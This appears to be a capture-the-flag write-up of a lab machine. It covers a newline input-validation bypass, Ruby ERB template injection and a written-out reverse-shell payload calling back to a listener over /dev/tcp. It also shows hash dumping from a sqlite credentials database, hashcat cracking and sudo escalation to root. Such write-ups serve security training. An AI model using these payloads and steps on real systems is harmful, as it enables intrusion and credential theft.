### Details: 
IP :  10.129.64.80

NMAP SCAN:  ![image](https://github.com/user-attachments/assets/2bac9034-4a19-4f70-bc82-2bf7e71f86c9)

## Q1 - What version of `OpenSSH` is running?
A: OpenSSH 8.9p1 running on port 22 from nmap scan

## Q2 - What programming language is the web application written in?

Use wappalyzer on website to find programming language
![Pasted image 20240720145652](https://github.com/user-attachments/assets/f29d417b-083a-4581-bf67-9f2d3bee705c)


## Q3 - Which endpoint on the web application allows for user input?
/weighted-grade allows user input
![Pasted image 20240720145738](https://github.com/user-attachments/assets/aafb2ed4-9742-4f9c-abaa-60fa89c4edc9)


## Q4 Which column on the grade-calculator page allows alphanumeric input?
Category only input that allows alphanumeric input

![Pasted image 20240720150024](https://github.com/user-attachments/assets/63b49de7-df3a-4984-9860-298ec030976a)


## Q5 - What is the URL-encoded value of the character you can use to bypass the input validation on the Category column?

### A: %0a
If we URL encode the linefeed value using **%0a** we can bypass the input validation
![Pasted image 20240720150650](https://github.com/user-attachments/assets/5d07ba2b-be6f-4a2a-876f-5cf1456ed2eb)
![Pasted image 20240720151024](https://github.com/user-attachments/assets/d4f3b1cc-b4f6-4f27-8753-d219cb8ec0c0)

We then test a Ruby SSTI (Server Side Template Injection)

We can use this basic injection found on github https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby---basic-injectionsand and test if the input is valid 
![Pasted image 20240720151326](https://github.com/user-attachments/assets/dbca26c4-cf85-4385-8b92-63d747d07654)
![Pasted image 20240720151423](https://github.com/user-attachments/assets/362198c3-fb19-4039-8081-7491eab5a78d)

We can see that when we input the command it gives us the output 49 meaning that it is vulnerable to code execution.

## Q6 What is the name of the templating system in use by this web application?
**Embedded Ruby (ERB)** is the templating system of Ruby. So the fact that this is vulnerable to SSTI means that the templating system is **Embedded Ruby (ERB)**.

# Next Steps

Since the website is vulnerable to SSTI we can use this to our advantage to spawn a reverse shell.

Create simple shell command :
**<%= IO.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").readlines() %>**
![image](https://github.com/user-attachments/assets/128f108b-e578-4125-aafd-ecaac9ef878c)


we setup our listener on the other side and hit enter

NC: 

![image](https://github.com/user-attachments/assets/ab0bf7f4-0b06-489e-8dfd-25742080b33e)


check if we have python 3 on the system then we can make a more interactive shell using 
**python3 -c 'import pty; pty.spawn("/bin/bash")'**

now we have a more interactive shell.

![image](https://github.com/user-attachments/assets/275da7e8-f1c9-4686-b5df-3aa05733eabb)


## Q7 Submit User Flag

![image](https://github.com/user-attachments/assets/e2c93d08-779d-40ba-937d-58467cfabb95)

## Q8 Which non-default group is the susan user a part of?

when we enter the command groups we can see that Susan is apart of the Sudo group.

![image](https://github.com/user-attachments/assets/71a7d4d4-fa76-41d0-8a87-b68ded7ca251)

## Q9 What is the full path of the sqlite database containing the susan user's password hash?
after looking around we find the database in:
/home/susan/Migration/pupilpath_credentials.db

using the command - sqlite3 pupilpath_credentials.db "select name, password from users" 

we retrieve the hashes

![image](https://github.com/user-attachments/assets/09153a53-4514-41da-ae7b-c689546e0f6a)

## What is susans user password
we also find looking around that susan has a default password format in an mail folder

![image](https://github.com/user-attachments/assets/bab15dfc-f90d-4af8-8ff1-670f69262d14)


since we know this we can create a custom wordlist and use hashcat to crack it
using the command
hashcat -m 1400 -a 6 susanhash susanwl ?d?d?d?d?d?d?d?d?d -O   

**-m 1400** = SHA256 Hash
**-**a 6** = attack mode hybrid since we are using our own wordlist
**susanhash** = the hash of susans pass
**susanwl** = "susan_nasus" since we know the password format from the email
**?d?d?d?d?d?d?d?d?d** = this represents the 9 digits to brute force
**-O** = optimization
#### We now have the cracked pw
![image](https://github.com/user-attachments/assets/498f5c1a-095a-48ab-9c6d-1df2f61a9358)




we can now use susans password to get to shell as she has sudo access

if we use the command sudo -i we can open a root shell.

this box is now completed
![image](https://github.com/user-attachments/assets/743fbdcb-cee7-4f73-b74b-a84eece8cead)

